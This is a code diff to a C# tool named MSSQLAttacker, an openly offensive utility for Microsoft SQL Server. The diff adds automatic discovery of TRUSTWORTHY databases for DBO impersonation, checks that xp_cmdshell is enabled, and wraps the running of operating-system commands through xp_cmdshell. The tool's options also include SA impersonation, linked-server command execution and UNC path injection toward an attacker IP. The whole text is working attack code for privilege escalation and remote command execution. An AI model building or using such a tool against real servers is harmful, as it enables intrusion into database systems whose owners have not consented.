@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections;
 using System.Collections.Generic;
 using System.Data.SqlClient;
@@ -97,10 +97,21 @@ namespace MSSQLAttacker
 
 
         }
+        static string checkImpersonateDBO(SqlConnection con)
+        {
+
+            String query = "SELECT name from sys.databases where is_trustworthy_on = 1;";
+            String databaseName = getFilteredResult(getQueryResult(con, query));
+            if (!string.IsNullOrEmpty(databaseName)) { doWrite(1,"Found Trustworthy Database") ; return databaseName; }
+            return "";
+
+        }
         static void abuseImpersonationDBO(SqlConnection con, [Optional, DefaultParameterValue(null)] String databaseName)
         {
+
             try
             {
+                if (string.IsNullOrEmpty(databaseName)) { databaseName = checkImpersonateDBO(con); }
                 while (string.IsNullOrEmpty(databaseName))
                 {
                     Console.Write("Enter Database Name:");
@@ -143,7 +154,7 @@ namespace MSSQLAttacker
         static void execCMD(SqlConnection con, [Optional, DefaultParameterValue(null)] String command)
         {
 
-            if (!enableXpCmdShell(con)) { return; };
+            if (!checkCmdshell(con)) {doWrite(0, "xp_cmdshell is not enabled") ;return; };
             if (string.IsNullOrEmpty(command))
             {
                 while (true)
@@ -166,9 +177,20 @@ namespace MSSQLAttacker
                 }
 
             }
-            String query = String.Format("EXEC xp_cmdshell '{0}'", command);
-            String queryout = getFilteredResult(getQueryResult(con, query));
-            doWrite(2, queryout);
+            try
+            {
+                String query = String.Format("EXEC xp_cmdshell '{0}'", command);
+                String queryout = getFilteredResult(getQueryResult(con, query));
+                doWrite(2, queryout);
+                return;
+
+            }
+            catch (Exception)
+            {
+
+                doWrite(0, "Missing Privileges || Ex.Sysadmin");
+            }
+            
 
         }
 
@@ -246,7 +268,15 @@ namespace MSSQLAttacker
             else { doWrite(0, "Linked Server: " + linkedServer + "\t Value In Use: " + valueInUse); return false; }
         }
 
+        static bool checkCmdshell(SqlConnection con)
+        {
+            String cmd = "select value_in_use from sys.configurations where name = 'xp_cmdshell'";
+            String valueInUse = getFilteredResult(getQueryResult(con, cmd));
+            if (valueInUse == "1") { doWrite(1, "Value In Use: " + valueInUse); doWrite(1, "xp_cmdshell is enabled"); return true; }
+            else { doWrite(0, "Value In Use: " + valueInUse); doWrite(0, "xp_cmdshell is not enabled" + valueInUse); return false; }
+        }
         static void enableLinkedCmdShell(SqlConnection con, [Optional, DefaultParameterValue(null)] String linkedServer)
+
         {
             while (string.IsNullOrEmpty(linkedServer))
             {
@@ -397,7 +427,7 @@ namespace MSSQLAttacker
             doWrite(2, " -d\t\t\tTarget DatabaseName", 0);
             doWrite(2, " -u\t\t\tTarget Username [Optional]", 0);
             doWrite(2, " -p\t\t\tTarget Password [Optional]", 0);
-            doWrite(2, " -dbo\t\t\tDatabaseNmae for DBO impersonation", 0);
+            doWrite(2, " -dbo\t\t\tDatabaseNmae for DBO impersonation [Optional]", 0);
             doWrite(2, " -ls\t\t\tLinked MSSQLServer Name", 0);
             doWrite(2, " -l\t\t\tAttacker IP for UNC Path Injection", 0);
             doWrite(2, " -impersonateSA\t\tImpersonateSA before execution of any attack", 0);
@@ -452,8 +482,6 @@ namespace MSSQLAttacker
                 if (!checkArgs(args, "-l")) { doWrite(0, "Missing -l [ LHOST || Attacker IP ]", 0); return false; }
                 arg = args[Array.IndexOf(args, "-l") + 1];
             }
-            if (Array.Exists(args, element => element == "-impersonateDBO")) { if (!checkArgs(args, "-dbo")) { doWrite(0, "Missing -dbo [ DatabaseName ]", 0); return false; } }
-
             return true;
         }
         static void attackCLI(string[] args)
@@ -475,7 +503,7 @@ namespace MSSQLAttacker
             dbname = args[Array.IndexOf(args, "-d") + 1];
             linkedServer = args[Array.IndexOf(args, "-ls") + 1];
             command = args[Array.IndexOf(args, "-c") + 1];
-            dboname = args[Array.IndexOf(args, "-dbo") + 1];
+            if(checkArgs(args, "-dbo")) { dboname = args[Array.IndexOf(args, "-dbo") + 1]; }
             lhost = args[Array.IndexOf(args, "-l") + 1];
             // Try connecting to the specified server
             try {
@@ -490,7 +518,7 @@ namespace MSSQLAttacker
             catch (Exception) { return; }
             //Impersonation
             if (Array.Exists(args, element => element == "-impersonateSA")) { abuseImpersonation(con); }
-            if (Array.Exists(args, element => element == "-impersonateDBO")){abuseImpersonationDBO(con, dboname);}
+            if (Array.Exists(args, element => element == "-impersonateDBO")){ if (checkArgs(args, "-dbo")) { abuseImpersonationDBO(con, dboname); } else { abuseImpersonationDBO(con); } }
 
 
             //Main Attack
